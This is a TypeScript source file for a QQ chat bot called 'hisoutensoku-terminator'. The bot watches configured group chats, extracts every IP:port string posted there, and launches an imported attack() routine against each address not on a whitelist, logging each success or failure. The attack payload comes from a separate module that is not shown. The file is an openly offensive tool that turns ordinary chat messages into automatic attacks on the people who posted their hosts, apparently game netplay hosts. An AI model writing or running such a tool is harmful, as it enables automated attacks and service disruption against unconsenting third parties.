import * as bunyan from "bunyan";
import * as fs from "fs";
import * as CQHttp from "cqhttp";
import * as _ from "underscore";
import * as yaml from "yaml";
import { spawn } from "child_process";
import { attack } from "./attacker";

interface CoolQConfig {
	apiRoot: string;
	accessToken: string;
	secret: string;
}

interface Config {
	address: string;
	port: number;
	coolq: CoolQConfig;
	floodQQGroups: Array<number>;
	attackTimeout: number;
	addressWhitelist: string[]
}

const log = bunyan.createLogger({
	name: "hisoutensoku-terminator"
});

let CoolQ: any, config: Config;

function sleep(time: number): Promise<void> {
	return new Promise((resolve, reject) => {
		setTimeout(resolve, time);
	});
};

async function startAttack(address: string, port: number): Promise<boolean> {
	if (_.contains(config.addressWhitelist, address)) {
		log.info(`Attack of ${address}:${port} skipped.`);
		return false;
	}
	log.info(`Attack of ${address}:${port} started.`);
	const err = await attack(address, port);
	if (err) {
		log.warn(`Attack of ${address}:${port} failed: ${err}`);
	} else {
		log.warn(`Attack of ${address}:${port} succeeded.`);
	}
	return !err;
}

async function messageHandler(data: any): Promise<void> {
	const groupID: number = data.group_id;
	if (!groupID || !_.contains(config.floodQQGroups, groupID)) {
		return;
	}
	const messageMatch: RegExpMatchArray = data.message.match(/(\d{1,3}(\.\d{1,3}){3}):(\d{1,5})/g);
	if (!messageMatch) {
		return;
	}
	const attackPromises = messageMatch.map(pattern => {
		const [address, portRaw] = pattern.split(":");
		const port = parseInt(portRaw);
		return startAttack(address, port);
	});
	const results: boolean[] =  await Promise.all(attackPromises);
}

async function main(): Promise<void> {
	config = yaml.parse(await fs.promises.readFile("./config.yaml", "utf8")) as Config;
	CoolQ = new CQHttp(config.coolq);
	CoolQ.on("message", messageHandler);
	CoolQ.listen(config.port, config.address);
 }
main();
